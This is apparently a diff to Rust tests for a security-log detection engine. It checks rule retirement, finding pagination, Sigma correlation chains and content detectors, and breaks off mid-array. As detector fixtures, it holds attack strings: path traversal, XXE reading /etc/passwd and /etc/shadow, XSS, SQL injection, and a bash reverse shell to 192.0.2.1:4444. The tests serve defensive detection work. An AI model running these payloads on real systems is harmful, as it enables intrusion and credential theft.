@@ -4,6 +4,323 @@ use crate::{
 };
 use serde_json::{json, Value};
 
+#[test]
+#[ignore = "Validação específica opt-in da 0.13; execute explicitamente com --ignored"]
+fn v013_every_retired_rule_has_an_individual_disposition_and_valid_hunt() {
+    let audit: Value =
+        serde_json::from_str(include_str!("../resources/detection-retirements.json")).unwrap();
+    let rules = detections::builtin_ruleset().unwrap();
+    let retired = rules
+        .rules
+        .iter()
+        .filter(|r| !r.def.enabled)
+        .map(|r| r.def.id.as_str())
+        .collect::<std::collections::BTreeSet<_>>();
+    let reviews = audit["reviews"].as_array().unwrap();
+    assert_eq!(retired.len(), 23);
+    let reviewed = reviews
+        .iter()
+        .map(|r| r["rule"].as_str().unwrap())
+        .collect::<std::collections::BTreeSet<_>>();
+    assert_eq!(reviewed, retired);
+    for review in reviews {
+        assert_eq!(review["decision"], "keep_standalone_retired");
+        assert!(crate::security_hunts::get(review["hunt"].as_str().unwrap()).is_some());
+        for key in [
+            "rationale",
+            "positive_context_to_evaluate",
+            "near_negative",
+            "missing_telemetry",
+        ] {
+            assert!(review[key].as_str().unwrap().len() >= 20, "{key}: {review}");
+        }
+        assert_eq!(review["representative_precision"], "not_demonstrated");
+    }
+}
+
+#[test]
+#[ignore = "Validação específica opt-in da 0.13; execute explicitamente com --ignored"]
+fn v013_dense_finding_keeps_every_member_behind_bounded_pages_and_exact_filter() {
+    let events=(0..350).map(|id|{let mut e=event(id,id as i64,json!({"user.name":format!("account-{id}"),"source.ip":"192.0.2.1","event.action":"logon","event.outcome":"failure"}));e.event_ref=format!("dense:{id:06}");e}).collect::<Vec<_>>();
+    let rule:crate::detections::RuleDef=serde_json::from_value(json!({"id":"dense","name":"Dense","severity":"medium","kind":"threshold","where":"_sec.outcome:failure","by":["@src_ip"],"window":"1h","count":20,"evidence":{"level":2,"maturity":"experimental"}})).unwrap();
+    let rules = detections::test_ruleset(vec![rule], vec![]).unwrap();
+    let settings = Settings {
+        threats: false,
+        investigation: crate::investigation::Settings {
+            enabled: false,
+            ..Default::default()
+        },
+        ..Default::default()
+    };
+    let inputs = detections::Inputs {
+        rules: &rules,
+        catalog: None,
+        settings: &settings,
+    };
+    let source = Source::Events(events.iter().collect());
+    let expected = detections::run(&inputs, &source).unwrap();
+    assert_eq!(expected.detections.len(), 1);
+    let stored = detections::run_stored(&inputs, &source).unwrap();
+    let page = stored.page(1, 0, 20, None, None).unwrap();
+    let finding = &page["detections"][0];
+    assert_eq!(finding["id"], expected.detections[0].id);
+    assert_eq!(finding["count"], 350);
+    assert_eq!(finding["evidence_members"].as_array().unwrap().len(), 128);
+    let id = finding["id"].as_str().unwrap();
+    let mut refs = vec![];
+    for offset in [0, 100, 200, 300] {
+        let page = stored
+            .investigation_page("finding_members", None, None, Some(id), offset, 100)
+            .unwrap();
+        assert_eq!(page["total"], 350);
+        refs.extend(
+            page["items"]
+                .as_array()
+                .unwrap()
+                .iter()
+                .map(|m| m["event_ref"].as_str().unwrap().to_string()),
+        );
+    }
+    assert_eq!(refs.len(), 350);
+    assert_eq!(refs, expected.detections[0].evidence.event_refs);
+    detections::remember("dense-exact-filter".into(), stored.clone());
+    let filters: Vec<crate::query::Filter> =
+        serde_json::from_value(finding["filters"].clone()).unwrap();
+    crate::workspace::validate(&filters).unwrap();
+    let prepared = crate::query::prepare(&filters);
+    assert!(crate::query::matches(events.last().unwrap(), &prepared[0]));
+    let mut other = events[349].clone();
+    other.id = 999;
+    assert!(!crate::query::matches(&other, &prepared[0]));
+}
+
+#[test]
+fn v013_population_pages_preserve_original_membership_and_atomic_saved_metadata() {
+    let events = (0..16)
+        .map(|id| {
+            let mut e = event(
+                id,
+                id as i64 * 45,
+                json!({"tenantId":"a","source.ip":"192.0.2.1","destination.ip":"203.0.113.1"}),
+            );
+            e.event_ref = format!("population:{id}");
+            e
+        })
+        .collect::<Vec<_>>();
+    let rules = detections::builtin_ruleset().unwrap();
+    let settings = Settings {
+        threats: false,
+        ..Default::default()
+    };
+    let result = detections::run_stored(
+        &detections::Inputs {
+            rules: &rules,
+            settings: &settings,
+            catalog: None,
+        },
+        &Source::Events(events.iter().collect()),
+    )
+    .unwrap();
+    let page = result
+        .investigation_page("signals", Some("a"), None, None, 0, 100)
+        .unwrap();
+    let signal = page["items"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|s| s["kind"] == "beaconing")
+        .unwrap();
+    let members = result
+        .investigation_page("members", Some("a"), None, signal["id"].as_str(), 0, 100)
+        .unwrap();
+    assert_eq!(members["total"], 16);
+    assert_eq!(
+        result
+            .investigation_page("members", Some("b"), None, signal["id"].as_str(), 0, 100)
+            .unwrap()["total"],
+        0
+    );
+    for member in members["items"].as_array().unwrap() {
+        assert!(result
+            .contains_member(
+                member["event_ref"].as_str().unwrap(),
+                member["event_id"].as_u64().unwrap() as usize
+            )
+            .unwrap());
+    }
+    assert_eq!(
+        result
+            .investigation_page("queue", Some("a"), None, None, 0, 100)
+            .unwrap()["total"],
+        1
+    );
+    let profile = result
+        .investigation_page("profile", Some("a"), Some("192.0.2.1"), None, 0, 20)
+        .unwrap();
+    assert_eq!(profile["items"][0]["statistics"]["population"], 16);
+    assert_eq!(
+        result
+            .investigation_page("profile", Some("b"), Some("192.0.2.1"), None, 0, 20)
+            .unwrap()["items"][0]["statistics"]["population"],
+        0
+    );
+    let coverage = result
+        .investigation_page("coverage", Some("a"), None, None, 0, 20)
+        .unwrap();
+    assert_eq!(coverage["total"], 12);
+    let network = coverage["items"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|i| i["id"] == "network")
+        .unwrap();
+    assert!(network["missing_fields"]
+        .as_array()
+        .unwrap()
+        .contains(&json!("bytes_with_unit")));
+    assert!(!network["missing_fields"]
+        .as_array()
+        .unwrap()
+        .contains(&json!("source_ip")));
+    assert!(result
+        .investigation_page("signals", None, None, None, 0, 101)
+        .is_err());
+    let hunts = result
+        .investigation_page("hunts", None, None, None, 0, 100)
+        .unwrap();
+    assert_eq!(hunts["total"], 12);
+    assert_eq!(
+        result
+            .investigation_page("hunt", Some("b"), None, Some("network"), 0, 100)
+            .unwrap()["total"],
+        0
+    );
+    let dir = tempfile::tempdir().unwrap();
+    let path = dir.path().join("analysis.sqlite");
+    result.save(&path).unwrap();
+    assert!(!path.with_extension("json").exists());
+    let reopened = crate::security_results::Results::open(&path).unwrap();
+    assert_eq!(reopened.metadata, result.metadata);
+    assert_eq!(
+        reopened
+            .investigation_page("members", Some("a"), None, signal["id"].as_str(), 0, 100)
+            .unwrap()["items"],
+        members["items"]
+    );
+    reopened.save(&path).unwrap();
+    assert_eq!(
+        crate::security_results::Results::open(&path)
+            .unwrap()
+            .metadata,
+        result.metadata
+    );
+}
+
+#[test]
+#[ignore = "Validação específica opt-in da 0.13; execute explicitamente com --ignored"]
+fn v013_chained_sigma_uses_completion_time_exact_members_and_namespace_isolation() {
+    let yaml = r#"title: Failed
+name: failed
+id: failed
+detection:
+  sel: {stage: failure}
+  condition: sel
+---
+title: Many failures
+name: many
+id: many
+correlation:
+  type: event_count
+  rules: [failed]
+  group-by: [user]
+  timespan: 5m
+  condition: {gte: 10}
+---
+title: Success
+name: success
+id: success
+detection:
+  sel: {stage: success}
+  condition: sel
+---
+title: Chained
+id: chained
+correlation:
+  type: temporal_ordered
+  rules: [many, success]
+  group-by: [user]
+  timespan: 5m
+"#;
+    let rules =
+        detections::test_ruleset(vec![], crate::sigma::convert_text(yaml).unwrap()).unwrap();
+    let evaluate = |events: &[Event]| {
+        detections::run(
+            &detections::Inputs {
+                rules: &rules,
+                catalog: None,
+                settings: &Settings {
+                    threats: false,
+                    ..Default::default()
+                },
+            },
+            &Source::Events(events.iter().collect()),
+        )
+        .unwrap()
+    };
+    let mut events = (0..10)
+        .map(|id| {
+            let mut e = event(
+                id,
+                id as i64,
+                json!({"tenantId":"a","user":"alice","stage":"failure"}),
+            );
+            e.event_ref = format!("chain:{id}");
+            e
+        })
+        .collect::<Vec<_>>();
+    let mut success = event(
+        10,
+        11,
+        json!({"tenantId":"a","user":"alice","stage":"success"}),
+    );
+    success.event_ref = "chain:10".into();
+    events.push(success.clone());
+    let positive = evaluate(&events);
+    let chain = positive
+        .detections
+        .iter()
+        .find(|d| d.rule == "sigma:chained")
+        .unwrap();
+    assert_eq!(chain.event_ids.len(), 11);
+    assert_eq!(chain.evidence.evidence_level, 0);
+    let coverage = positive
+        .rule_coverage
+        .iter()
+        .find(|r| r.rule == "sigma:chained")
+        .unwrap();
+    assert_eq!(coverage.status, "complete");
+    assert_eq!(coverage.unit, "referenced_findings");
+    assert_eq!(coverage.eligible, coverage.applicable);
+    events.reverse();
+    assert_eq!(
+        evaluate(&events)
+            .detections
+            .iter()
+            .find(|d| d.rule == "sigma:chained")
+            .unwrap()
+            .id,
+        chain.id
+    );
+    events.reverse();
+    events[10].fields.insert("tenantId".into(), json!("b"));
+    assert!(!contains(&evaluate(&events), "sigma:chained"));
+    events[10] = success;
+    events[10].timestamp = Some(1_699_999_999_000);
+    assert!(!contains(&evaluate(&events), "sigma:chained"));
+    events.pop();
+    assert!(!contains(&evaluate(&events), "sigma:chained"));
+}
+
 fn event(id: usize, seconds: i64, fields: Value) -> Event {
     let mut e = Event::empty();
     e.id = id;
@@ -21,9 +338,16 @@ fn process(id: usize, seconds: i64, command: &str) -> Event {
 }
 fn run(events: &[Event]) -> Triage {
     let rules = detections::builtin_ruleset().unwrap();
-    let settings = Settings { threats: false, ..Default::default() };
+    let settings = Settings {
+        threats: false,
+        ..Default::default()
+    };
     detections::run(
-        &detections::Inputs { rules: &rules, settings: &settings, catalog: None },
+        &detections::Inputs {
+            rules: &rules,
+            settings: &settings,
+            catalog: None,
+        },
         &Source::Events(events.iter().collect()),
     )
     .unwrap()
@@ -50,165 +374,400 @@ fn content_application_log_paths_have_deliberate_levels_and_exact_excerpts() {
         ("/etc/shadows", "sensitive_request", 3),
         ("/geoserver/.htpasswds", "sensitive_request", 3),
         ("/geoserver/.env.production", "ambiguous_request", 1),
-        ("/download?file=../../application/startup.conf", "path_traversal", 3),
-        ("/download?file=..%252f..%252fetc%252fpasswd", "traversal_request", 3),
+        (
+            "/download?file=../../application/startup.conf",
+            "path_traversal",
+            3,
+        ),
+        (
+            "/download?file=..%252f..%252fetc%252fpasswd",
+            "traversal_request",
+            3,
+        ),
     ] {
         let event = application_request(0, 0, path);
         let result = run(&[event.clone()]);
-        let d = result.detections.iter().find(|d| d.rule == format!("content.{rule}")).unwrap_or_else(|| panic!("missing {rule} for {path}"));
+        let d = result
+            .detections
+            .iter()
+            .find(|d| d.rule == format!("content.{rule}"))
+            .unwrap_or_else(|| panic!("missing {rule} for {path}"));
         assert_eq!(d.evidence.evidence_level, level, "{path}");
-        assert_eq!(d.evidence.outcome,"failure");
-        assert_eq!(d.evidence.claim,"attempt");
-        assert!(d.evidence.checks.iter().any(|c|c.status=="passed" && !c.event_refs.is_empty()));
-        assert!(d.evidence.checks.iter().any(|c|c.status=="failed" && c.observed=="failure"));
-        let x=&d.evidence.excerpts[0];
-        assert_eq!(x.field,"message");
-        if !path.contains('%') { assert_eq!(&event.message[x.start..x.end],x.matched); assert!(x.before.contains("URI")); }
+        assert_eq!(d.evidence.outcome, "failure");
+        assert_eq!(d.evidence.claim, "attempt");
+        assert!(d
+            .evidence
+            .checks
+            .iter()
+            .any(|c| c.status == "passed" && !c.event_refs.is_empty()));
+        assert!(d
+            .evidence
+            .checks
+            .iter()
+            .any(|c| c.status == "failed" && c.observed == "failure"));
+        let x = &d.evidence.excerpts[0];
+        assert_eq!(x.field, "message");
+        if !path.contains('%') {
+            assert_eq!(&event.message[x.start..x.end], x.matched);
+            assert!(x.before.contains("URI"));
+        }
     }
-    for path in ["/index.html","/api/credentials","/assets/env.production.js","/images/id_rsa_1024.png","/help/etc/passwd.html","/user/password-reset","../styles/theme.css"] {
-        assert!(run(&[application_request(0,0,path)]).detections.is_empty(),"benign near miss: {path}");
+    for path in [
+        "/index.html",
+        "/api/credentials",
+        "/assets/env.production.js",
+        "/images/id_rsa_1024.png",
+        "/help/etc/passwd.html",
+        "/user/password-reset",
+        "../styles/theme.css",
+    ] {
+        assert!(
+            run(&[application_request(0, 0, path)])
+                .detections
+                .is_empty(),
+            "benign near miss: {path}"
+        );
     }
 }
 
 #[test]
 fn content_xxe_parser_denial_and_payload_do_not_assert_disclosure() {
     let raw="01:53:47,839 ERROR [org.geoserver.ows] (http-/0.0.0.0:443-26) : org.geoserver.platform.ServiceException: org.xml.sax.SAXException: Entity resolution disallowed for file:///etc/passwd\n\tat org.geoserver.wfs.kvp.FilterKvpParser.parseXMLFilterWithOldParser(FilterKvpParser.java:145)";
-    let e=crate::sources::parse_line(raw.as_bytes(),"wildfly",None,&[]);
-    let result=run(&[e]);
-    let d=result.detections.iter().find(|d|d.rule=="content.xxe_blocked").expect("XML parser diagnosis");
-    assert_eq!((d.evidence.evidence_level,d.evidence.claim.as_str(),d.evidence.outcome.as_str()),(4,"attempt","blocked"));
-    assert!(!result.detections.iter().any(|d|d.evidence.claim=="effect"||d.rule.contains("disclosure")));
-    let payload=r#"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><Filter><PropertyIsEqual"#;
-    let mut e=event(0,0,json!({}));e.message=payload.into();
-    assert_eq!(run(&[e.clone()]).detections.iter().find(|d|d.rule=="content.xxe_payload").unwrap().evidence.evidence_level,3);
-    e.fields.insert("http.request.body.content".into(),json!(payload));e.message.clear();
-    assert_eq!(run(&[e.clone()]).detections.iter().find(|d|d.rule=="content.xxe_request").unwrap().evidence.evidence_level,4);
-    for benign in [r#"<!DOCTYPE note SYSTEM "https://example.org/note.dtd">"#,r#"<!ENTITY app SYSTEM "file:///app/schema.dtd">"#,"Entity resolution disallowed for https://example.org/schema.dtd"] {
-        e.fields.clear();e.message=benign.into();assert!(run(&[e.clone()]).detections.is_empty(),"{benign}");
+    let e = crate::sources::parse_line(raw.as_bytes(), "wildfly", None, &[]);
+    let result = run(&[e]);
+    let d = result
+        .detections
+        .iter()
+        .find(|d| d.rule == "content.xxe_blocked")
+        .expect("XML parser diagnosis");
+    assert_eq!(
+        (
+            d.evidence.evidence_level,
+            d.evidence.claim.as_str(),
+            d.evidence.outcome.as_str()
+        ),
+        (4, "attempt", "blocked")
+    );
+    assert!(!result
+        .detections
+        .iter()
+        .any(|d| d.evidence.claim == "effect" || d.rule.contains("disclosure")));
+    let payload =
+        r#"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><Filter><PropertyIsEqual"#;
+    let mut e = event(0, 0, json!({}));
+    e.message = payload.into();
+    assert_eq!(
+        run(&[e.clone()])
+            .detections
+            .iter()
+            .find(|d| d.rule == "content.xxe_payload")
+            .unwrap()
+            .evidence
+            .evidence_level,
+        3
+    );
+    e.fields
+        .insert("http.request.body.content".into(), json!(payload));
+    e.message.clear();
+    assert_eq!(
+        run(&[e.clone()])
+            .detections
+            .iter()
+            .find(|d| d.rule == "content.xxe_request")
+            .unwrap()
+            .evidence
+            .evidence_level,
+        4
+    );
+    for benign in [
+        r#"<!DOCTYPE note SYSTEM "https://example.org/note.dtd">"#,
+        r#"<!ENTITY app SYSTEM "file:///app/schema.dtd">"#,
+        "Entity resolution disallowed for https://example.org/schema.dtd",
+    ] {
+        e.fields.clear();
+        e.message = benign.into();
+        assert!(run(&[e.clone()]).detections.is_empty(), "{benign}");
     }
-    e.fields.insert("event.kind".into(),json!("documentation"));e.message=payload.into();
+    e.fields.insert("event.kind".into(), json!("documentation"));
+    e.message = payload.into();
     assert!(run(&[e]).detections.is_empty());
 }
 
 #[test]
 fn content_request_payloads_are_not_inconclusive_or_sql_errors() {
     for (path, rule) in [
-        ("/search=<script>alert('XSS')</script>","xss_request"),
-        ("/?q=%3Cimg%20src=x%20onerror=alert(1)%3E","xss_request"),
-        ("/?id=1%20UNION%20SELECT%20username,password%20FROM%20users--","sqli_request"),
-        ("/?id=' OR 1=1--","sqli_request"),
-        ("/?id=1%27+OR+%271%27=%271%27--","sqli_request"),
-        ("/?id='; SELECT pg_sleep(5)--","sqli_request"),
+        ("/search=<script>alert('XSS')</script>", "xss_request"),
+        ("/?q=%3Cimg%20src=x%20onerror=alert(1)%3E", "xss_request"),
+        (
+            "/?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
+            "sqli_request",
+        ),
+        ("/?id=' OR 1=1--", "sqli_request"),
+        ("/?id=1%27+OR+%271%27=%271%27--", "sqli_request"),
+        ("/?id='; SELECT pg_sleep(5)--", "sqli_request"),
     ] {
-        let r=run(&[application_request(0,0,path)]);
-        let d=r.detections.iter().find(|d|d.rule==format!("content.{rule}")).unwrap_or_else(||panic!("missing {path}"));
-        assert_eq!(d.evidence.evidence_level,3);
-        assert_eq!(d.evidence.outcome,"failure");
+        let r = run(&[application_request(0, 0, path)]);
+        let d = r
+            .detections
+            .iter()
+            .find(|d| d.rule == format!("content.{rule}"))
+            .unwrap_or_else(|| panic!("missing {path}"));
+        assert_eq!(d.evidence.evidence_level, 3);
+        assert_eq!(d.evidence.outcome, "failure");
     }
-    for path in ["/?q=select+product","/?q=You+have+an+error+in+your+SQL+syntax","/js/application.js","/?id=' OR 1=2--"] {
-        assert!(run(&[application_request(0,0,path)]).detections.is_empty(),"{path}");
+    for path in [
+        "/?q=select+product",
+        "/?q=You+have+an+error+in+your+SQL+syntax",
+        "/js/application.js",
+        "/?id=' OR 1=2--",
+    ] {
+        assert!(
+            run(&[application_request(0, 0, path)])
+                .detections
+                .is_empty(),
+            "{path}"
+        );
     }
-    let mut docs=application_request(0,0,"/?q=<script>alert(1)</script>");
-    docs.message=format!("Example: {}",docs.message);
+    let mut docs = application_request(0, 0, "/?q=<script>alert(1)</script>");
+    docs.message = format!("Example: {}", docs.message);
     assert!(run(&[docs]).detections.is_empty());
 }
 
 #[test]
 fn content_probe_correlation_counts_families_and_scopes_not_retries() {
-    let paths=["/app/.env.old","/app/id_rsa_3072","/app/mysqldump.sql"];
-    let events:Vec<_>=paths.iter().enumerate().map(|(id,path)|application_request(id,id as i64,path)).collect();
-    let result=run(&events);
-    let d=result.detections.iter().find(|d|d.rule=="content.sensitive_probe_set").expect("three distinct families");
-    assert_eq!(d.evidence.evidence_level,3);assert_eq!(d.distinct,3);assert_eq!(d.event_ids,vec![0,1,2]);
-    assert_eq!(result.detections.iter().find(|d|d.rule=="content.ambiguous_request").unwrap().evidence.evidence_level,1);
-    for field in ["source.ip","host.name","service.name","cloud.account.id","caminho"] {
-        let changed:Vec<_>=events.iter().enumerate().map(|(i,e)|{let mut e=e.clone();e.fields.insert(field.into(),json!(format!("different-{i}")));e}).collect();
-        assert!(!contains(&run(&changed),"content.sensitive_probe_set"),"{field}");
+    let paths = ["/app/.env.old", "/app/id_rsa_3072", "/app/mysqldump.sql"];
+    let events: Vec<_> = paths
+        .iter()
+        .enumerate()
+        .map(|(id, path)| application_request(id, id as i64, path))
+        .collect();
+    let result = run(&events);
+    let d = result
+        .detections
+        .iter()
+        .find(|d| d.rule == "content.sensitive_probe_set")
+        .expect("three distinct families");
+    assert_eq!(d.evidence.evidence_level, 3);
+    assert_eq!(d.distinct, 3);
+    assert_eq!(d.event_ids, vec![0, 1, 2]);
+    assert_eq!(
+        result
+            .detections
+            .iter()
+            .find(|d| d.rule == "content.ambiguous_request")
+            .unwrap()
+            .evidence
+            .evidence_level,
+        1
+    );
+    for field in [
+        "source.ip",
+        "host.name",
+        "service.name",
+        "cloud.account.id",
+        "caminho",
+    ] {
+        let changed: Vec<_> = events
+            .iter()
+            .enumerate()
+            .map(|(i, e)| {
+                let mut e = e.clone();
+                e.fields
+                    .insert(field.into(), json!(format!("different-{i}")));
+                e
+            })
+            .collect();
+        assert!(
+            !contains(&run(&changed), "content.sensitive_probe_set"),
+            "{field}"
+        );
     }
-    let mut outside=events.clone();outside[2].timestamp=outside[0].timestamp.map(|t|t+600001);
-    assert!(!contains(&run(&outside),"content.sensitive_probe_set"));
-    let retry:Vec<_>=["/.env.old","/.env.production","/.env.local","/.env.bak"].iter().enumerate().map(|(i,p)|application_request(i,i as i64,p)).collect();
-    assert!(!contains(&run(&retry),"content.sensitive_probe_set"));
-    let no_time:Vec<_>=events.iter().cloned().map(|mut e|{e.timestamp=None;e}).collect();
-    assert!(!contains(&run(&no_time),"content.sensitive_probe_set"));
+    let mut outside = events.clone();
+    outside[2].timestamp = outside[0].timestamp.map(|t| t + 600001);
+    assert!(!contains(&run(&outside), "content.sensitive_probe_set"));
+    let retry: Vec<_> = ["/.env.old", "/.env.production", "/.env.local", "/.env.bak"]
+        .iter()
+        .enumerate()
+        .map(|(i, p)| application_request(i, i as i64, p))
+        .collect();
+    assert!(!contains(&run(&retry), "content.sensitive_probe_set"));
+    let no_time: Vec<_> = events
+        .iter()
+        .cloned()
+        .map(|mut e| {
+            e.timestamp = None;
+            e
+        })
+        .collect();
+    assert!(!contains(&run(&no_time), "content.sensitive_probe_set"));
 }
 
 #[test]
 fn content_xxe_target_boundaries_and_config_ambiguity() {
-    for payload in [r#"<!ENTITY x SYSTEM "file:///etc/passwd.html">"#,r#"<!ENTITY x SYSTEM "http://localhost.example.org/schema">"#,
-        "Entity resolution disallowed for file:///etc/passwd.html",r#"<!ENTITY x SYSTEM "php://filter/resource=/app/schema.dtd">"#] {
-        let mut e=event(0,0,json!({}));e.message=payload.into();
-        assert!(run(&[e]).detections.is_empty(),"{payload}");
+    for payload in [
+        r#"<!ENTITY x SYSTEM "file:///etc/passwd.html">"#,
+        r#"<!ENTITY x SYSTEM "http://localhost.example.org/schema">"#,
+        "Entity resolution disallowed for file:///etc/passwd.html",
+        r#"<!ENTITY x SYSTEM "php://filter/resource=/app/schema.dtd">"#,
+    ] {
+        let mut e = event(0, 0, json!({}));
+        e.message = payload.into();
+        assert!(run(&[e]).detections.is_empty(), "{payload}");
     }
-    let r=run(&[application_request(0,0,"/app/config/config.dev.yml")]);
-    assert_eq!(r.detections.iter().find(|d|d.rule=="content.ambiguous_request").unwrap().evidence.evidence_level,1);
+    let r = run(&[application_request(0, 0, "/app/config/config.dev.yml")]);
+    assert_eq!(
+        r.detections
+            .iter()
+            .find(|d| d.rule == "content.ambiguous_request")
+            .unwrap()
+            .evidence
+            .evidence_level,
+        1
+    );
 }
 
 #[test]
 fn content_any_original_field_nested_array_and_raw_keep_provenance() {
-    let payload=r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>"#;
+    let payload = r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>"#;
     for (fields, message, raw, expected) in [
-        (json!({"vendorBlob":payload}),"","","vendorBlob"),
-        (json!({"opaque":{"chunks":[{"value":payload}]}}),"","","opaque.chunks.0.value"),
-        (json!({}),"",payload,"raw"),
-        (json!({}),payload,"","message"),
+        (json!({"vendorBlob":payload}), "", "", "vendorBlob"),
+        (
+            json!({"opaque":{"chunks":[{"value":payload}]}}),
+            "",
+            "",
+            "opaque.chunks.0.value",
+        ),
+        (json!({}), "", payload, "raw"),
+        (json!({}), payload, "", "message"),
     ] {
-        let mut e=event(0,0,fields);e.message=message.into();e.raw=raw.into();
-        let result=run(&[e]);let d=result.detections.iter().find(|d|d.rule=="content.xxe_payload").unwrap();
-        assert_eq!(d.evidence.evidence_level,3);assert_eq!(d.evidence.claim,"activity");
-        assert_eq!(d.evidence.excerpts[0].field,expected);
+        let mut e = event(0, 0, fields);
+        e.message = message.into();
+        e.raw = raw.into();
+        let result = run(&[e]);
+        let d = result
+            .detections
+            .iter()
+            .find(|d| d.rule == "content.xxe_payload")
+            .unwrap();
+        assert_eq!(d.evidence.evidence_level, 3);
+        assert_eq!(d.evidence.claim, "activity");
+        assert_eq!(d.evidence.excerpts[0].field, expected);
     }
-    let line="No mapping found for HTTP request with URI [/other/id_rsa_4096] in dispatcher";
-    let e=event(0,0,json!({"original":{"unexpected":line}}));
-    let r=run(&[e]);let d=r.detections.iter().find(|d|d.rule=="content.sensitive_request").unwrap();
-    assert_eq!(d.evidence.evidence_level,3);assert_eq!(d.evidence.excerpts[0].field,"original.unexpected");
-    assert_eq!(&line[d.evidence.excerpts[0].start..d.evidence.excerpts[0].end],d.evidence.excerpts[0].matched);
-    for (text,rule,level) in [("<script>alert('XSS')</script>","xss_payload",2),
-        ("%3Cscript%3Ealert(1)%3C/script%3E","xss_payload",2),("' OR 1=1--","sqli_payload",2),
-        ("../../etc/passwd","traversal_payload",3),("bash -i >& /dev/tcp/192.0.2.1/4444 0>&1","reverse_payload",4)] {
-        let e=event(0,0,json!({"opaque":{"items":[text]}}));
-        let result=run(&[e]);let d=result.detections.iter().find(|d|d.rule==format!("content.{rule}")).unwrap_or_else(||panic!("{rule}"));
-        assert_eq!(d.evidence.evidence_level,level);assert_eq!(d.evidence.excerpts[0].field,"opaque.items.0");
+    let line = "No mapping found for HTTP request with URI [/other/id_rsa_4096] in dispatcher";
+    let e = event(0, 0, json!({"original":{"unexpected":line}}));
+    let r = run(&[e]);
+    let d = r
+        .detections
+        .iter()
+        .find(|d| d.rule == "content.sensitive_request")
+        .unwrap();
+    assert_eq!(d.evidence.evidence_level, 3);
+    assert_eq!(d.evidence.excerpts[0].field, "original.unexpected");
+    assert_eq!(
+        &line[d.evidence.excerpts[0].start..d.evidence.excerpts[0].end],
+        d.evidence.excerpts[0].matched
+    );
+    for (text, rule, level) in [
+        ("<script>alert('XSS')</script>", "xss_payload", 2),
+        ("%3Cscript%3Ealert(1)%3C/script%3E", "xss_payload", 2),
+        ("' OR 1=1--", "sqli_payload", 2),
+        ("../../etc/passwd", "traversal_payload", 3),
+        (
+            "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1",
+            "reverse_payload",
+            4,
+        ),
+    ] {
+        let e = event(0, 0, json!({"opaque":{"items":[text]}}));
+        let result = run(&[e]);
+        let d = result
+            .detections
+            .iter()
+            .find(|d| d.rule == format!("content.{rule}"))
+            .unwrap_or_else(|| panic!("{rule}"));
+        assert_eq!(d.evidence.evidence_level, level);
+        assert_eq!(d.evidence.excerpts[0].field, "opaque.items.0");
     }
 }
 
 #[test]
 fn content_generic_scan_keeps_boundaries_and_does_not_use_enrichment() {
-    for fields in [json!({"a":"<!ENTITY xxe SYSTEM ","b":"file:///etc/passwd"}),
+    for fields in [
+        json!({"a":"<!ENTITY xxe SYSTEM ","b":"file:///etc/passwd"}),
         json!({"a":"<script>","b":"alert(1)</script>"}),
         json!({"a":"' OR 1=", "b":"1--"}),
         json!({"query":"SELECT a FROM users UNION SELECT a FROM archived_users"}),
         json!({"opaque":"Documentation: <script>alert(1)</script>"}),
-        json!({"_sec.content.xxe_request":"true"})] {
-        assert!(run(&[event(0,0,fields.clone())]).detections.is_empty(),"{fields}");
+        json!({"_sec.content.xxe_request":"true"}),
+    ] {
+        assert!(
+            run(&[event(0, 0, fields.clone())]).detections.is_empty(),
+            "{fields}"
+        );
     }
-    let mut e=event(0,0,json!({}));e.name="<script>alert(1)</script>".into();e.description="' OR 1=1--".into();
+    let mut e = event(0, 0, json!({}));
+    e.name = "<script>alert(1)</script>".into();
+    e.description = "' OR 1=1--".into();
     assert!(run(&[e]).detections.is_empty());
-    let e=event(0,0,json!({"opaque":{"first":"<script>alert(1)</script>","copy":"<script>alert(1)</script>"}}));
-    let r=run(&[e]);let ds:Vec<_>=r.detections.iter().filter(|d|d.rule=="content.xss_payload").collect();
-    assert_eq!(ds.len(),1);assert_eq!(ds[0].evidence.evidence_level,2);assert_eq!(ds[0].evidence.excerpts.len(),1);
-    let fields:serde_json::Map<_,_>=(0..140).map(|i|(format!("field-{i:03}"),json!("value"))).collect();
-    let (_,normalized)=crate::security_normalize::normalize(&event(0,0,Value::Object(fields)),&[]);
-    assert!(normalized.content_clipped);assert!(!normalized.limitations.is_empty());
+    let e = event(
+        0,
+        0,
+        json!({"opaque":{"first":"<script>alert(1)</script>","copy":"<script>alert(1)</script>"}}),
+    );
+    let r = run(&[e]);
+    let ds: Vec<_> = r
+        .detections
+        .iter()
+        .filter(|d| d.rule == "content.xss_payload")
+        .collect();
+    assert_eq!(ds.len(), 1);
+    assert_eq!(ds[0].evidence.evidence_level, 2);
+    assert_eq!(ds[0].evidence.excerpts.len(), 1);
+    let fields: serde_json::Map<_, _> = (0..140)
+        .map(|i| (format!("field-{i:03}"), json!("value")))
+        .collect();
+    let (_, normalized) =
+        crate::security_normalize::normalize(&event(0, 0, Value::Object(fields)), &[]);
+    assert!(normalized.content_clipped);
+    assert!(!normalized.limitations.is_empty());
 }
 
 #[test]
 fn content_catalog_parity_does_not_promote_normal_sql_or_returned_scripts() {
-    let rules=detections::builtin_ruleset().unwrap();let catalog=crate::threats::builtin_catalog();let settings=Settings::default();
-    let input=detections::Inputs {rules:&rules,catalog:Some(&catalog),settings:&settings};
-    for fields in [json!({"sql":"SELECT name FROM users UNION SELECT name FROM old_users"}),
+    let rules = detections::builtin_ruleset().unwrap();
+    let catalog = crate::threats::builtin_catalog();
+    let settings = Settings::default();
+    let input = detections::Inputs {
+        rules: &rules,
+        catalog: Some(&catalog),
+        settings: &settings,
+    };
+    for fields in [
+        json!({"sql":"SELECT name FROM users UNION SELECT name FROM old_users"}),
         json!({"http.response.body.content":"<script>alert(1)</script>"}),
         json!({"opaque":"echo '<script>alert(1)</script>'"}),
         json!({"opaque":"Documentation: <script>alert(1)</script>"}),
         json!({"opaque":"echo '<script>alert(1)</script>'","event.kind":"documentation"}),
-        json!({"response":{"body":"No mapping found for HTTP request with URI [/etc/passwd] in dispatcher"}})] {
